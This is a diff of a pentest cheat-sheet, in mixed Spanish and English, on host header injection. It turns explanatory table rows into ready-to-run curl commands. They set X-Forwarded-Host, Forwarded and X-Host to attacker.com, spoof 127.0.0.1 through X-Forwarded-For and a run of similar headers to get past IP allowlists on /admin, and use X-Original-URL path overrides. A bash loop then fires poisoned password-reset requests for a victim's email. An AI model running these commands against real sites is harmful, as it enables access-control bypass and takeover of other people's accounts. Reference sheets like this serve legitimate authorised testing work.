@@ -24,17 +24,12 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Standard XFH | `X-Forwarded-Host: attacker.com` | Most common alternative. |
-| XFH con port | `X-Forwarded-Host: attacker.com:443` | Port included. |
-| Multiple values | `X-Forwarded-Host: a.com, b.com` | Comma-separated. |
-| XFH overrides Host | Backend trusts XFH > Host | Reverse proxy convention. |
-| XFH stripped at frontend | Frontend (CDN) strips → backend sees raw Host | Per-deploy. |
-| Combine con Host | Both headers different values | Confusion. |
-| `X-Forwarded-Proto` paired | `X-Forwarded-Proto: https` para construct URL | Combined. |
-| Trusted IP-only | XFH only honored from trusted IPs | Bypass via spoofing IP. |
-| Per-path override | App reads XFH solo en certain paths | Edge. |
-| Apache `mod_remoteip` | Apache uses XFH to set remote IP | Different impact. |
-| nginx `real_ip_header` | nginx config reads specific header | Per-config. |
+| `curl -H "X-Forwarded-Host: attacker.com" https://target/` | Backend trusts XFH > Host → URL construction usa attacker | Reverse proxy convention. |
+| `curl -H "X-Forwarded-Host: attacker.com:443" https://target/` | XFH con port custom | Port routing differential. |
+| `curl -H "X-Forwarded-Host: a.com, b.com" https://target/` | Multiple values comma-separated | First/last wins varies. |
+| `curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" -H "X-Forwarded-Proto: https" https://target/` | Combo paired headers para URL construct | Backend builds URL from XFH+XFP. |
+| `curl -H "X-Forwarded-Host: attacker.com" -H "X-Forwarded-For: 10.0.0.1" https://target/` | Spoof IP allowlist + XFH combo | Trusted-IP-only XFH bypass. |
+| `curl -H "X-Forwarded-Host: target.com.attacker.com" https://target/` | Suffix bypass de validation | Validator naive. |
 ^hhi-altheader-xfh
 
 ___
@@ -43,19 +38,16 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| XFF en Host context | `X-Forwarded-For: attacker.com` | Normalmente IP, pero apps laxas. |
-| Spoof internal IP | `X-Forwarded-For: 127.0.0.1` | Internal trust bypass. |
-| Cloud metadata IP | `X-Forwarded-For: 169.254.169.254` | If app fetches based on IP. |
-| Multiple XFF | `X-Forwarded-For: real, attacker, internal` | Last/first wins varies. |
-| XFF + IP allowlist | If allowlist reads XFF without verify | Auth bypass. |
-| `X-Real-IP: 127.0.0.1` | Same vector | Common alternative. |
-| `Client-IP` header | Same | Edge. |
-| `True-Client-IP` header | Akamai-style | Same. |
-| `Cluster-Client-IP` | Internal cluster header | Edge. |
-| `X-Originating-IP` | Less common | Edge. |
-| `Cf-Connecting-IP` | Cloudflare-specific | Bypass if not stripped. |
-| `Fastly-Client-IP` | Fastly-specific | Same. |
-| Combine HHI + IP | Both Host attacker + XFF localhost | Multi-vector. |
+| `curl -H "X-Forwarded-For: 127.0.0.1" https://target/admin` | IP allowlist bypass — internal trust | Backend trusts XFF para auth. |
+| `curl -H "X-Forwarded-For: 169.254.169.254" https://target/api/x` | Cloud metadata IP spoof | App reads XFF para fetch routing. |
+| `curl -H "X-Forwarded-For: a.com, attacker.com, internal" https://target/` | Multiple XFF — first/last wins | Differential parsing. |
+| `curl -H "X-Real-IP: 127.0.0.1" https://target/admin` | Same vector vía X-Real-IP | nginx convention. |
+| `curl -H "Client-IP: 127.0.0.1" https://target/admin` | Client-IP variant | Edge. |
+| `curl -H "True-Client-IP: 127.0.0.1" https://target/admin` | Akamai-style header | Akamai-fronted. |
+| `curl -H "Cluster-Client-IP: 127.0.0.1" https://target/admin` | Internal cluster header | Edge. |
+| `curl -H "X-Originating-IP: 127.0.0.1" https://target/admin` | Less common | Edge. |
+| `curl -H "Cf-Connecting-IP: 127.0.0.1" https://target/admin` | Cloudflare-specific | Bypass si CF no strip. |
+| `for h in 'X-Forwarded-For' 'X-Real-IP' 'Client-IP' 'True-Client-IP' 'Cluster-Client-IP' 'X-Originating-IP' 'Cf-Connecting-IP' 'Fastly-Client-IP'; do curl -sI -H "$h: 127.0.0.1" https://target/admin \| head -1; done` | Bulk IP-spoof header probe | Discovery. |
 ^hhi-altheader-xff
 
 ___
@@ -64,13 +56,10 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Standard XFS | `X-Forwarded-Server: attacker.com` | Less common. |
-| Apache mod_proxy | Adds XFS in chained proxies | Apache specific. |
-| Disclosure header | Can leak internal server name | Recon. |
-| Combine con XFH | Both headers | Confusion. |
-| Frameworks recognition | Spring, Django specifics | Per-framework. |
-| Tomcat AJP injection | Adjacent vector | Stack-specific. |
-| Generic header rewrite | Backend may use as Host equivalent | Edge. |
+| `curl -H "X-Forwarded-Server: attacker.com" https://target/` | XFS-based Host injection | Apache mod_proxy chain. |
+| `curl -sI -H "X-Forwarded-Server: x" https://target/ \| grep -i 'x-forwarded-server'` | Reflection check | Pre-attack probe. |
+| `curl -H "Host: target.com" -H "X-Forwarded-Server: internal-server" https://target/` | Internal server disclosure via reflection | Apache stack. |
+| `curl -H "X-Forwarded-Server: attacker.com" -H "X-Forwarded-Host: attacker.com" https://target/` | Combo con XFH | Multi-header confusion. |
 ^hhi-altheader-xfs
 
 ___
@@ -79,15 +68,11 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Custom override | `X-HTTP-Host-Override: attacker.com` | Direct override. |
-| `X-Host: attacker.com` | Custom header | Frequent en custom apps. |
-| `X-Forwarded-Server: attacker.com` | Variant | Same. |
-| `Forwarded: host=attacker.com` | RFC 7239 standard | Modern syntax. |
-| Multi-value Forwarded | `Forwarded: host=a;proto=https, host=b` | Multiple proxies en chain. |
-| Apache convenience | Some Apache configs use X-Host | Per-config. |
-| nginx | Can use any header | Configurable. |
-| Frameworks autoresolution | Spring `useForwardHeaders=true` | Stack-aware. |
-| Custom headers list | App-specific (X-Forwarded-Whatever) | Recon. |
+| `curl -H "X-HTTP-Host-Override: attacker.com" https://target/` | Direct Host override custom | App con custom override header. |
+| `curl -H "X-Host: attacker.com" https://target/` | X-Host variant | Frequent en custom apps. |
+| `curl -H "Forwarded: host=attacker.com" https://target/` | RFC 7239 standard syntax | Modern apps Spring 5.1+. |
+| `curl -H "Forwarded: host=a;proto=https, host=b" https://target/` | Multiple proxies en chain syntax | Chain ambiguity. |
+| `for h in 'X-HTTP-Host-Override' 'X-Host' 'X-Forwarded-Host' 'X-Forwarded-Server' 'X-Original-Host' 'Forwarded'; do curl -sI -H "$h: attacker.com" https://target/ \| head -1; done` | Bulk override-header probe | Discovery. |
 ^hhi-altheader-host-override
 
 ___
@@ -96,17 +81,12 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | IIS-specific headers que override path/URL | IIS-only typical. |
-| Path override | `X-Original-URL: /admin` | Backend processes admin path while client sees /. |
-| Bypass auth on /admin | If front blocks /admin URL but back uses X-Original-URL | Standard auth bypass. |
-| `X-Rewrite-URL: /admin` | Same effect | Variant. |
-| Combine con HHI | Atacante's Host + X-Original-URL | Multi-vector. |
-| `X-Forwarded-URL` | Less common | Edge. |
-| `X-Custom-IP-Authorization` | Bypass IP-based auth en specific apps | Atlassian/Confluence (CVE). |
-| URL structure changes | Path en header vs URI line | Differential. |
-| Method override pair | `X-HTTP-Method-Override: GET` + `X-Original-URL: /admin` | Method + path swap. |
-| WAF bypass | Front WAF processes URI, back uses header | Standard. |
-| Combine con Host | Different host + path override | Compound. |
+| `curl -H "X-Original-URL: /admin" https://target/` | Path override → backend procesa /admin mientras URI line es / | IIS-specific WAF bypass. |
+| `curl -H "X-Rewrite-URL: /admin" https://target/` | Variant del path override | Same effect. |
+| `curl -H "X-Custom-IP-Authorization: 127.0.0.1" https://target/admin` | Atlassian/Confluence CVE bypass | Confluence apps. |
+| `curl -H "X-Original-URL: /admin" -H "X-HTTP-Method-Override: GET" https://target/` | Combo path + method override | Compound bypass. |
+| `curl -H "X-Original-URL: /admin" -H "X-Forwarded-Host: attacker.com" https://target/` | Combo host + path | HHI compound. |
+| `for h in 'X-Original-URL' 'X-Rewrite-URL' 'X-Forwarded-URL' 'X-Original-Path' 'X-Custom-IP-Authorization'; do curl -sI -H "$h: /admin" https://target/ \| head -1; done` | Bulk path-override probe | Discovery. |
 ^hhi-altheader-original
 
 ___
@@ -115,24 +95,18 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Standard syntax | `Forwarded: by=<proxy>;for=<client>;host=<host>;proto=<scheme>` | RFC 7239. |
-| Host injection | `Forwarded: host=attacker.com` | Direct. |
-| For injection | `Forwarded: for=127.0.0.1` | IP spoof. |
-| Proto injection | `Forwarded: proto=https` | Force scheme. |
-| Multiple proxies | `Forwarded: for=a, for=b, for=c` | Chain syntax. |
-| Quoted values | `Forwarded: host="attacker.com"` | Quotes optional. |
-| Encoded values | `Forwarded: host=attacker%2Ecom` | Edge. |
-| Combine con XFH | Multiple alternative headers | Confusion. |
-| Modern frameworks | Spring 5.1+ supports Forwarded native | Stack-aware. |
-| nginx config | Can extract Forwarded values | Per-config. |
-| AWS ALB headers | ALB adds X-Forwarded-* — Forwarded less | Per-cloud. |
-| Test if backend reads Forwarded | If yes → vector | Standard probe. |
+| `curl -H "Forwarded: host=attacker.com" https://target/` | Host injection RFC 7239 syntax | Modern apps. |
+| `curl -H "Forwarded: for=127.0.0.1" https://target/admin` | IP spoof via Forwarded | IP-based ACL bypass. |
+| `curl -H "Forwarded: proto=https" https://target/` | Force scheme | Scheme-based logic. |
+| `curl -H "Forwarded: by=lb1;for=127.0.0.1;host=attacker.com;proto=https" https://target/` | Full RFC syntax con todos params | Compound injection. |
+| `curl -H 'Forwarded: host="attacker.com"' https://target/` | Quoted values (RFC permits) | Parser differential. |
+| `curl -H "Forwarded: for=a, for=b, for=c" https://target/` | Multiple proxies chain | First/last wins. |
+| `curl -H "Forwarded: host=attacker%2Ecom" https://target/` | Encoded values | Bypass naive validation. |
 ^hhi-altheader-rfc7239
 
 ### Multi-header probe combo
 
 ```bash
-# Test all alt headers para password reset
 HEADERS=(
   'X-Forwarded-Host: attacker.com'
   'X-Forwarded-Server: attacker.com'
@@ -146,10 +120,8 @@ HEADERS=(
 
 for h in "${HEADERS[@]}"; do
   echo "=== $h ==="
-  R=$(curl -s -X POST -H "Host: target.com" -H "$h" \
-       -d 'email=victim@target.com' \
-       https://target.com/forgot)
-  echo "$R" | head -c 200
+  curl -s -X POST -H "Host: target.com" -H "$h" \
+    -d 'email=victim@target.com' https://target.com/forgot | head -c 200
 done
 ```
 
